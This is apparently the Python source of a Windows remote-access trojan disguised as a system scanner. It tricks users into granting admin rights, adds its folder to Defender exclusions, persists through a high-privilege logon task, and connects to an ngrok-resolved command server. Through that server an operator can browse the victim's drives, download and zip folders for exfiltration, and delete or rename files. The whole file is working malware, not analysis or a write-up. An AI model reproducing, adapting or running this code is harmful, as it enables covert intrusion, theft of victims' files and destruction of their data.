import socketio, sys, os, zipfile, requests, subprocess, ctypes, time
from uuid import uuid4, getnode
from datetime import datetime
from infection_urls import fake_name, ngrok_linker_url

# ------------------------ SECURITY BYPASS -------------------------
ware_name = sys.argv[0].split("\\")[-1].split(".")[0]
my_directory = os.getenv("APPDATA")+'\\DefenderService'
path_of_exe = f"{my_directory}\\{ware_name}.exe"
def admin_bypass():
    if not os.path.exists(my_directory):
        os.mkdir(my_directory)
    elif ware_name+".exe" in os.listdir(my_directory):
        return "ALREADY_SETUP"

    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    if not is_admin:
        ctypes.windll.user32.MessageBoxW(None, "Failed to scan system,\nPlease consider running as administrator.", "Failed", 0x00000000 | 0x00001000 | 0x00040000 | 0x00000010)
        sys.exit(0)

    subprocess.Popen(["powershell.exe", "-Command", f"Add-MpPreference -ExclusionPath \"{my_directory}\""])
    with open(sys.argv[0], "rb") as fp:
        data_to_write = fp.read()
        fp.close()
        with open(path_of_exe.replace(".exe", ""), "wb") as fp2:
            fp2.write(data_to_write)
    os.rename(path_of_exe.replace(".exe", ""), path_of_exe)
    os.system(f"schtasks.exe /Create /SC onlogon /TN \"{fake_name}\" /TR \"{path_of_exe}\" /RL HIGHEST /F")
    os.system(f"schtasks.exe /Run /TN \"{fake_name}\"")
    os.system("msg * /TIME:2 [67695] SCAN COMPLETED")
    sys.exit()  # PREVENTS RUNNING IT FROM PATH WHERE USER HAVE INSTALLED IT. (FROM PD OR OTHER REMOVABLE MEDIA)
admin_bypass()  # UNCOMMENT IT

# ----------------------------- END ------------------------------

# --------------------- SOME FUNCTIONS -------------------
def getDriveInfos():
    f = os.popen("wmic logicaldisk get name, size, FreeSpace /format:csv").read()
    while "\n\n" in f:
        f = f.replace("\n\n", "\n")
    f = f[1:-1]
    to_ret = []
    rows_ = f.split("\n")
    cols = rows_[0].split(",")
    for item in rows_[1:]:
        to_append = {}
        for idx2, item2 in enumerate(item.split(",")):
            to_append[cols[idx2]] = item2
        to_ret.append(to_append)
    return to_ret

def adv_listdir(path_):
    to_ret = []
    for item in os.listdir(path_):
        creation_date = str(datetime.fromtimestamp(os.path.getctime(os.path.join(path_, item))))
        if os.path.isfile(os.path.join(path_, item)):
            size_ = os.path.getsize(os.path.join(path_, item))
            to_ret.append({"type": "file", "size": size_, "creation_date": creation_date, "name": item})
        else:
            try:
                items_count = len(os.listdir(os.path.join(path_, item)))
            except BaseException:
                items_count = "ACCESS_DENIED"
            to_ret.append({"type": "folder", "items": items_count, "creation_date": creation_date, "name": item})
    return to_ret

def get_mac():
    try:
        mac_ = hex(getnode())[2:]
        to_ret = ""
        for i in range(0, len(mac_)-1, 2):
            to_ret += mac_[i: i+2] + ":"
        return to_ret[:-1].upper()
    except BaseException:
        return "UNDEFINED"
# ------------------------ END -------------------------

while 1:
    try:
        r = requests.post(ngrok_linker_url)
        url_ = r.text
        # url_ = "http://127.0.0.1:5000"  # JUST FOR DEVELOPMENT

        ws = socketio.Client()

        class FileExplorerController(socketio.ClientNamespace):
            zipper_running = False
            zip_file_name = None

            def on_connect(self):
                print("CONNECTED")
                self.emit("register_target", {"mac_addr": get_mac(), "user_name": os.getenv("USERNAME")})

            def on_list_drives(self):
                self.emit("response_channel", {"drives": getDriveInfos(), "type": "drive_list"})

            def on_list_files(self, data_=None):
                if data_ is None or "path" not in data_:
                    data_ = {"path": "./"}
                self.emit("response_channel", {"medias": adv_listdir(data_["path"]), "cwd": os.getcwd(), "type": "media_list"})

            def on_switch_dir(self, data_):
                try:
                    os.listdir(data_["path"])
                    os.chdir(data_["path"])
                    self.on_list_files()
                except BaseException as e:
                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})

            def on_download_file(self, data_):
                try:
                    file_size = os.path.getsize(data_["file_name"])
                    with open(data_["file_name"], "rb") as fp:
                        to_send = fp.read()[data_["seg_from"]: data_["seg_to"]]
                    if data_["seg_to"] >= file_size:
                        data_["transmission_end"] = True
                        if self.zip_file_name:
                            try:
                                os.remove(self.zip_file_name)
                            except BaseException : pass
                            self.zip_file_name = None

                    data_["seg_from"] = data_["seg_to"]
                    data_["seg_to"] += data_["chunk_size"]
                    data_["bytes"] = to_send
                    data_["type"] = "file_chunk_resp"
                    data_["current_chunk"] += 1
                    data_["total_chunks"] = file_size//data_["chunk_size"]
                    self.emit("response_channel", data_)
                except BaseException as e:
                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})

            def on_delete_media(self, data_):
                try:
                    if data_["type"] == "file":
                        os.remove(data_["media_name"])
                        self.on_list_files()
                        self.emit("response_channel", {"msg": f"file {data_['media_name']} deleted!", "type": "success_msg"})
                    elif data_["type"] == "folder":
                        out_ = os.popen(f"rmdir /s /q \"{data_['media_name']}\"").read()
                        if len(out_) < 1:
                            self.on_list_files()
                            self.emit("response_channel", {"msg": f"folder {data_['media_name']} deleted!", "type": "success_msg"})
                        else:
                            raise Exception(out_)
                except BaseException as e:
                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})

            def on_rename_media(self, data_):
                try:
                    os.rename(data_["old_name"], data_["new_name"])
                    self.on_list_files()
                    self.emit("response_channel", {"msg": f"Media successfully renamed from '{data_['old_name']}' to '{data_['new_name']}'", "type": "success_msg"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to rename\n{str(e)}", "type": "error_msg"})

            def on_create_new_file(self, data_):
                try:
                    if os.path.exists(data_["file_name"]):
                        raise Exception("file already exists")
                    with open(data_["file_name"], "ab") as fp:
                        fp.close()
                    self.on_list_files()
                    self.emit("response_channel", {"msg": f"File '{data_['file_name']}' created successfully!", "type": "success_msg"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to create file\n{str(e)}", "type": "error_msg"})

            def on_create_new_folder(self, data_):
                try:
                    os.mkdir(data_["folder_name"])
                    self.on_list_files()
                    self.emit("response_channel", {"msg": f"Folder '{data_['folder_name']}' created successfully!", "type": "success_msg"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to create folder\n{str(e)}", "type": "error_msg"})

            def on_begin_zip_folder(self, data_):
                try:
                    self.zip_file_name = str(uuid4()).replace("-", "")+".zip"
                    zip_handle = zipfile.ZipFile(self.zip_file_name, "w")
                    self.zipper_running = True
                    idx = 0
                    walker = os.walk(data_["folder_name"])  # can't use walker both time its expression evaluated due to generator object once used gets creared up.
                    for path_, dir_, files_ in walker:
                        for file_ in files_:
                            idx += 1
                            file_with_path = path_+"\\"+file_
                            zip_handle.write(file_with_path, file_with_path)
                            if not self.zipper_running: break
                        if not self.zipper_running: break

                    if self.zipper_running:
                        self.zipper_running = False
                        self.emit("response_channel", {"info": {"zip_file_name": self.zip_file_name}, "type": "zipping_done"})
                    else:
                        if self.zip_file_name:
                            try:
                                os.remove(self.zip_file_name)
                            except BaseException : pass
                            self.zip_file_name = None
                        self.emit("response_channel", {"msg": f"zipping folder cancelled successfully", "type": "zipping_cancelled"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to create zip\n{str(e)}", "type": "error_msg"})

            def on_cancle_zip_folder(self):
                self.zipper_running = False

            def on_quit_explorer(self):
                ws.disconnect()


        ws.register_namespace(FileExplorerController("/file_explorer"))
        ws.connect(url_)
        ws.wait()
    except BaseException as e:
        time.sleep(3)
        print("ERROR WHILE CONNECTING ", e)
        print("RECONNECTING...")
# python .\file_explorer_script.py --wsurl="http://isc.cc:5000"